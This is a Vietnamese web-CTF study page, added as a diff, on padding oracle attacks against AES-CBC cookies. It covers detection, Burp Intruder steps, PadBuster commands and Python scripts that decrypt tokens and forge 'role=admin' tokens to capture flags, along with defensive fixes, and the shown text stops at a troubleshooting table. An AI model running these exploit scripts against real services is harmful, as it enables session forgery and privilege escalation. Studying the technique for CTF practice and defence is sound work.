@@ -1,0 +1,512 @@
+<title>Padding Oracle — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Crypto · Padding Oracle</div>
+    <h1>Padding Oracle Attack</h1>
+    <p class="sub">Khi app mã hoá dữ liệu bằng AES ở chế độ CBC rồi gửi cho người dùng (vd trong cookie), và
+    app PHẢN ỨNG KHÁC NHAU giữa "padding sai" và "padding đúng nhưng dữ liệu vô nghĩa" lúc giải mã — bạn có thể
+    dùng chính server làm "máy giải mã" để tự giải mã hoặc tự mã hoá bất kỳ dữ liệu, không cần biết khoá bí mật.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ (padbuster)</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Padding Oracle là gì?</h2>
+  <p class="lead">AES CBC mã hoá theo từng khối (block) 16 byte. Vì dữ liệu gốc hiếm khi đúng y 16/32/48... byte,
+  người ta thêm "đệm" (padding) vào cuối theo chuẩn <strong>PKCS#7</strong> trước khi mã hoá. Khi giải mã, app
+  phải kiểm tra padding có đúng chuẩn không — nếu app <strong>trả lỗi khác nhau</strong> cho 2 trường hợp
+  "padding sai" (lỗi 400/500, thông báo "invalid padding") so với "padding đúng" (lỗi khác hoặc 200), bạn có
+  "oracle" (cái máy trả lời đúng/sai) để dò từng byte, cuối cùng tự giải mã/tự mã hoá được bất cứ gì, không cần
+  biết khoá.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Không cần hiểu toán học padding oracle — chỉ cần nhận diện đúng dấu hiệu (cookie/token là hex hoặc base64, độ
+  dài luôn là bội số của 16) và dùng công cụ <code>padbuster</code>/<code>PadBuster</code> có sẵn, công cụ tự
+  làm hết phần dò byte.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ PADDING ORACLE</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Cookie/token là chuỗi hex hoặc base64 có <strong>độ dài luôn là bội số của 16 byte</strong>, và khi bạn
+        sửa 1 ký tự trong đó, app trả về lỗi liên quan tới "decrypt"/"padding" ⟹ rất khả nghi AES-CBC có padding
+        oracle.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Phải tìm được 2 response KHÁC NHAU rõ ràng khi gửi token với padding sai vs token với padding đúng (dù
+        dữ liệu bên trong vô nghĩa) — khác biệt có thể là mã lỗi HTTP, nội dung thông báo, hoặc cả độ trễ phản
+        hồi (timing oracle, khó hơn).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Sửa byte cuối cùng của token (hex), gửi lại — nếu lỗi đổi từ "generic error" sang "padding error" tuỳ
+        giá trị byte bạn thử ⟹ xác nhận oracle tồn tại.
+      </div>
+      <div class="cslot"><span class="lab">💥 Lệnh dán-chạy-ngay (PadBuster — giải mã)</span>
+<pre><code>cd ~/hoc/CTF/Tools/web/padbuster
+perl PadBuster.pl http://TARGET/page TOKEN_HEX_HERE 16 \
+  -cookies "auth=TOKEN_HEX_HERE" -encoding 1</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (dò oracle, dùng khi không có Perl/padbuster)</span>
+<pre><code><span class="k">import</span> requests
+
+<span class="k">def</span> <span class="d">is_padding_ok</span>(token_hex):
+    r = requests.get(<span class="s">"http://TARGET/page"</span>, cookies={<span class="s">"auth"</span>: token_hex})
+    <span class="k">return</span> <span class="s">"padding"</span> <span class="k">not in</span> r.text.lower() <span class="k">and</span> r.status_code != 500</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Oracle phải TRẢ LỖI KHÁC NHAU — nếu app luôn trả 200 OK như nhau cho mọi lỗi decrypt thì không khai
+        thác được (đây chính là cách fix đúng, mục 10). WAF/app rule nhanh: luôn trả 1 thông báo lỗi DUY NHẤT,
+        chung, cho MỌI lỗi giải mã (sai padding, sai MAC, dữ liệu rác...), không phân biệt loại lỗi.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước (không cần sâu toán học)</h2>
+  <div class="def"><b>Block cipher</b> — thuật toán mã hoá theo từng khối dữ liệu cố định (AES = khối 16 byte),
+  khác với "stream cipher" mã hoá từng byte liên tục.</div>
+  <div class="def"><b>CBC (Cipher Block Chaining)</b> — chế độ mã hoá nối các khối với nhau: mỗi khối bản mã
+  (ciphertext) được XOR với khối TRƯỚC KHI MÃ HÓA của khối tiếp theo. Điểm quan trọng cho tấn công: khối
+  ciphertext trước đó ảnh hưởng trực tiếp (qua XOR) tới kết quả giải mã của khối sau — <strong>bạn có thể sửa
+  khối trước để điều khiển byte giải mã ra ở khối sau</strong>.</div>
+  <div class="def"><b>PKCS#7 padding</b> — quy tắc đệm: nếu cần đệm N byte, TẤT CẢ N byte đệm đó phải có giá trị
+  bằng chính N. Ví dụ cần đệm 3 byte → đệm bằng <code>03 03 03</code>. Khi giải mã, app kiểm tra: byte cuối là
+  N → N byte cuối phải đều bằng N, nếu không ⟹ lỗi padding.</div>
+  <p>Oracle (trong thuật ngữ bảo mật) là bất kỳ thứ gì trả lời được câu hỏi đúng/sai mà kẻ tấn công lợi dụng để
+  dò thông tin — ở đây, "app có báo lỗi padding không" chính là câu trả lời đúng/sai đó.</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>App "thành thật" quá mức khi báo lỗi</h2>
+  <p>Dev muốn giúp debug nên viết code phân biệt rõ 2 loại lỗi: "padding không hợp lệ" (ném exception riêng,
+  vd <code>PaddingException</code>) và "dữ liệu giải mã được nhưng không parse được" (lỗi khác). Sự phân biệt
+  này — tưởng như vô hại, chỉ để debug dễ hơn — lại chính là "oracle" mà kẻ tấn công cần. Vấn đề không phải do
+  AES yếu, mà do CÁCH APP XỬ LÝ LỖI đã vô tình làm lộ 1 bit thông tin (đúng/sai padding) ra ngoài.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Dò từng byte bằng cách sửa khối trước (XOR)</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr22)}
+    </style>
+    <defs><marker id="arr22" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="200" height="50" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">Khối C1 (bạn sửa từng byte</text>
+    <text x="22" y="54" class="lbl-a">cuối, thử 0-255)</text>
+
+    <rect x="250" y="20" width="200" height="50" rx="10" class="box"/>
+    <text x="262" y="40" class="lbl-m">Khối C2 (ciphertext thật,</text>
+    <text x="262" y="54" class="lbl-m">không đổi)</text>
+
+    <path d="M310,70 V95" class="arrow"/>
+    <path d="M110,70 V95" class="arrow"/>
+    <rect x="10" y="100" width="440" height="40" rx="10" class="box"/>
+    <text x="22" y="124" class="lbl-m">server: Decrypt(C2) XOR C1_đã_sửa = plaintext thử</text>
+
+    <path d="M230,140 V165" class="arrow"/>
+    <rect x="10" y="170" width="440" height="40" rx="10" class="box-a"/>
+    <text x="22" y="194" class="lbl-a">server kiểm tra padding -&gt; trả lỗi khác nhau (ORACLE!)</text>
+
+    <text x="470" y="50" class="lbl-m" font-style="italic">Thử 256 giá trị byte</text>
+    <text x="470" y="65" class="lbl-m" font-style="italic">cuối của C1, byte nào</text>
+    <text x="470" y="80" class="lbl-m" font-style="italic">làm padding "hợp lệ"</text>
+    <text x="470" y="95" class="lbl-m" font-style="italic">-&gt; suy ra 1 byte plaintext</text>
+    <text x="470" y="115" class="lbl-m" font-style="italic">thật qua phép XOR ngược.</text>
+    <text x="470" y="140" class="lbl-m" font-style="italic">Lặp lại cho từng byte,</text>
+    <text x="470" y="155" class="lbl-m" font-style="italic">từng khối -&gt; giải mã</text>
+    <text x="470" y="170" class="lbl-m" font-style="italic">TOÀN BỘ token, và còn có</text>
+    <text x="470" y="185" class="lbl-m" font-style="italic">thể tự MÃ HOÁ dữ liệu mới.</text>
+  </svg>
+  </div>
+  <p>Điều đáng sợ nhất: kỹ thuật này không chỉ cho GIẢI MÃ, mà còn cho <strong>TỰ MÃ HOÁ</strong> bất kỳ dữ liệu
+  bạn muốn (vd đổi <code>role=user</code> thành <code>role=admin</code> trong token), dù không hề biết khoá bí
+  mật — đây là lý do padding oracle nguy hiểm tương đương lộ khoá.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Dấu hiệu + cách test nhanh oracle có thật</h2>
+  <ul>
+    <li>Cookie/token/param là chuỗi hex hoặc base64, độ dài LUÔN là bội số của 16 byte (16, 32, 48...).</li>
+    <li>App có chức năng "giải mã" dữ liệu từ input người dùng (cookie session tự chế độ mã hoá riêng, không
+    phải JWT/thư viện chuẩn).</li>
+  </ul>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Lấy token mẫu</div><div class="d">Decode hex/base64, xác nhận độ dài chia hết cho 16.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Sửa byte cuối</div><div class="d">Đổi byte cuối cùng của token thành 1 giá trị ngẫu nhiên, gửi lại, ghi lại response (mã lỗi + nội dung).</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Thử giá trị khác</div><div class="d">Thử thêm 2-3 giá trị byte cuối khác — nếu response CHIA THÀNH 2 NHÓM rõ rệt (không phải random mỗi lần khác nhau) ⟹ có oracle.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dùng Intruder để xác nhận oracle trước khi chạy công cụ tự động</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request có token nghi ngờ, Send to Intruder.</li>
+    <li>Đánh dấu vị trí 2 ký tự hex cuối cùng của token làm payload position.</li>
+    <li>Payload type: <strong>Brute forcer</strong>, charset <code>0123456789abcdef</code>, length 2 (quét hết
+    256 giá trị byte cuối).</li>
+    <li>Start attack, sort theo <strong>Length</strong> hoặc <strong>Status code</strong> của response — nếu
+    thấy phần lớn kết quả rơi vào 1 nhóm, và 1 vài (thường ~1/256) rơi vào nhóm khác ⟹ xác nhận oracle, byte đó
+    chính là giá trị làm padding hợp lệ.</li>
+  </ol></div>
+  <p>Sau khi xác nhận oracle bằng Intruder, chuyển sang dùng PadBuster (mục 07) để tự động hoá toàn bộ quá
+  trình dò — không nên tự làm tay cho hết 16+ byte, quá tốn thời gian.</p>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD / THAM SỐ CẦN XÁC ĐỊNH</div>
+  <h2>3 thứ cần biết trước khi chạy công cụ</h2>
+  <table>
+    <tr><th>Tham số</th><th>Cách xác định</th></tr>
+    <tr><td>Block size</td><td>Hầu hết AES = 16 byte (mặc định dùng 16 nếu không chắc)</td></tr>
+    <tr><td>Encoding của token</td><td>Hex thuần, Base64 thường, hoặc Base64 URL-safe — xem trực tiếp trong cookie/URL</td></tr>
+    <tr><td>Chuỗi/mã báo "lỗi padding"</td><td>So sánh response của 2-3 giá trị byte cuối khác nhau (mục 04) — tìm từ khoá hoặc status code đặc trưng chỉ xuất hiện ở 1 nhóm</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: PADBUSTER</div>
+  <h2>Không tự viết thuật toán dò byte — dùng PadBuster</h2>
+  <div class="def"><b>PadBuster</b> — công cụ Perl kinh điển, tự động hoá toàn bộ thuật toán padding oracle: tự
+  gửi hàng trăm request thử mọi byte, tự nhận diện response nào là "lỗi" dựa theo độ dài/nội dung bạn chỉ định,
+  rồi in ra plaintext đã giải mã VÀ cho phép bạn tự mã hoá dữ liệu mới (chức năng <code>-plaintext</code>).</div>
+  <pre><code><span class="c"># Cài (nếu chưa có) -- clone về thư mục công cụ dùng chung</span>
+cd ~/hoc/CTF/Tools/web &amp;&amp; git clone --depth 1 https://github.com/AonCyberLabs/PadBuster.git padbuster
+
+<span class="c"># Giải mã 1 token hex hiện có</span>
+cd ~/hoc/CTF/Tools/web/padbuster
+perl PadBuster.pl http://TARGET/page \
+  deadbeef00112233deadbeef00112233 16 \
+  -cookies "auth=deadbeef00112233deadbeef00112233" \
+  -encoding 1   <span class="c"># 0=base64, 1=hex-lower, 2=hex-upper, 3=.NET,...</span>
+
+<span class="c"># Sau khi chạy, PadBuster hỏi bạn chọn error string (dựa response khác biệt)</span>
+<span class="c"># rồi tự dò hết, in ra: "Decrypted data: role=user"</span>
+
+<span class="c"># TỰ MÃ HOÁ dữ liệu mới (không cần biết khoá) để leo thang quyền</span>
+perl PadBuster.pl http://TARGET/page \
+  deadbeef00112233deadbeef00112233 16 \
+  -cookies "auth=deadbeef00112233deadbeef00112233" \
+  -plaintext "role=admin" -encoding 1</code></pre>
+  <div class="note tip"><span class="tag">Kết quả quan trọng nhất</span>Lệnh <code>-plaintext</code> ở trên in
+  ra 1 token HEX MỚI đã được "mã hoá giả" (không cần biết khoá thật) chứa nội dung <code>role=admin</code> —
+  dán token này thay cookie cũ để leo thang quyền trực tiếp.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Khi không có Perl/PadBuster — tự viết dò oracle bằng Python</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước (dò 1 byte cuối cùng)</h3>
+  <pre><code><span class="k">import</span> requests, binascii
+
+BLOCK = 16
+URL = <span class="s">"http://TARGET/page"</span>
+TOKEN = <span class="s">"deadbeef00112233deadbeef00112233"</span>   <span class="c"># 2 block 16-byte, hex</span>
+
+<span class="k">def</span> <span class="d">oracle</span>(token_hex):
+    <span class="c"># True = padding HỢP LỆ (không lỗi padding)</span>
+    r = requests.get(URL, cookies={<span class="s">"auth"</span>: token_hex}, timeout=5)
+    <span class="k">return</span> <span class="s">"padding"</span> <span class="k">not in</span> r.text.lower()
+
+raw = bytearray.fromhex(TOKEN)
+<span class="c"># sửa byte cuối cùng (vị trí -1), thử 256 giá trị</span>
+<span class="k">for</span> guess <span class="k">in</span> range(256):
+    raw[-1] = guess
+    <span class="k">if</span> oracle(raw.hex()):
+        <span class="k">print</span>(<span class="s">f"Padding hợp lệ với byte cuối = {guess:02x}"</span>)
+        <span class="k">break</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thẳng PadBuster làm lõi, Python chỉ gọi và parse</h3>
+  <pre><code><span class="k">import</span> subprocess, re
+
+<span class="k">def</span> <span class="d">decrypt_token</span>(host, token_hex):
+    out = subprocess.run(
+        [<span class="s">"perl"</span>, <span class="s">"PadBuster.pl"</span>, <span class="s">f"http://{host}/page"</span>, token_hex, <span class="s">"16"</span>,
+         <span class="s">"-cookies"</span>, <span class="s">f"auth={token_hex}"</span>, <span class="s">"-encoding"</span>, <span class="s">"1"</span>, <span class="s">"-noiv"</span>],
+        cwd=<span class="s">"/home/ld/hoc/CTF/Tools/web/padbuster"</span>, capture_output=<span class="k">True</span>, text=<span class="k">True</span>, timeout=120)
+    m = re.search(<span class="s">r"Decrypted data: (.+)"</span>, out.stdout)
+    <span class="k">return</span> m.group(1) <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(decrypt_token(<span class="s">"TARGET_IP"</span>, <span class="s">"deadbeef00112233deadbeef00112233"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — tự mã hoá token admin 1 lần, dùng cho mọi đội</h3>
+  <pre><code><span class="k">import</span> subprocess, re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PADBUSTER = <span class="s">"/home/ld/hoc/CTF/Tools/web/padbuster"</span>
+
+<span class="k">def</span> <span class="d">forge_admin_token</span>(host, sample_token_hex):
+    out = subprocess.run(
+        [<span class="s">"perl"</span>, <span class="s">"PadBuster.pl"</span>, <span class="s">f"http://{host}/page"</span>, sample_token_hex, <span class="s">"16"</span>,
+         <span class="s">"-cookies"</span>, <span class="s">f"auth={sample_token_hex}"</span>, <span class="s">"-plaintext"</span>, <span class="s">"role=admin"</span>,
+         <span class="s">"-encoding"</span>, <span class="s">"1"</span>, <span class="s">"-noiv"</span>],
+        cwd=PADBUSTER, capture_output=<span class="k">True</span>, text=<span class="k">True</span>, timeout=120)
+    m = re.search(<span class="s">r"New Cookie: auth=(\S+)"</span>, out.stdout)
+    <span class="k">return</span> m.group(1) <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">def</span> <span class="d">exploit_padoracle</span>(host, sample_token_hex):
+    forged = forge_admin_token(host, sample_token_hex)
+    <span class="k">if</span> <span class="k">not</span> forged:
+        <span class="k">return</span> <span class="k">None</span>
+    r = requests.get(<span class="s">f"http://{host}/admin"</span>, cookies={<span class="s">"auth"</span>: forged}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span></code></pre>
+  <div class="note warn"><span class="tag">Khác các bài khác</span>Mỗi đội thường dùng KHOÁ MÃ HOÁ khác nhau (nếu
+  service random seed theo team), nên bước <code>forge_admin_token</code> thường phải chạy LẠI cho từng host,
+  không tái dùng được 1 token chung như các bài command injection/SQLi.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Đăng nhập user thường, thấy cookie <code>auth=deadbeef...</code> (hex, độ dài 32 = 2 khối 16 byte).</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận oracle</div><div class="d">Sửa byte cuối, gửi lại vài lần bằng Burp Intruder → thấy 2 nhóm response rõ rệt (status 500 "Padding error" vs status 200).</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Giải mã token hiện có</div><div class="d">Chạy PadBuster với encoding=1 → kết quả: <code>uid=42&amp;role=user</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Tự mã hoá token mới</div><div class="d">Dùng <code>-plaintext "uid=42&amp;role=admin"</code> → PadBuster in ra token hex mới.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Dán token mới vào cookie, truy cập <code>/admin</code> → response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>WAF khó chặn đúng — fix ở code mới triệt để</h2>
+  <div class="note warn"><span class="tag">Thành thật: WAF không phải cách phòng thủ phù hợp ở đây</span>
+  Payload padding oracle chỉ là 1 token hex/base64 bình thường về HÌNH THỨC — không có chữ ký bất thường nào để
+  viết regex chặn mà không chặn luôn token hợp lệ. WAF chỉ có thể làm giảm nhẹ: rate-limit số request decrypt
+  trên 1 IP/session trong thời gian ngắn (vd &gt;50 request thử token biến thể trong 10s ⟹ chặn tạm) — nhưng
+  đây là giảm nhẹ, không phải chặn triệt để, và cần cẩn thận không vi phạm luật "không chặn theo IP" của giải
+  (xem lại Combat Card tổng, mục rules).</div>
+  <p><strong>Fix đúng (ở code, không phải WAF):</strong> dùng <strong>AES-GCM</strong> (có xác thực tích hợp,
+  tự phát hiện dữ liệu bị sửa trước khi kiểm tra padding) thay cho CBC thuần, hoặc nếu giữ CBC thì luôn trả 1
+  thông báo lỗi DUY NHẤT cho mọi lỗi giải mã (không phân biệt "sai padding" với "parse lỗi").</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi PadBuster không chạy đúng</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
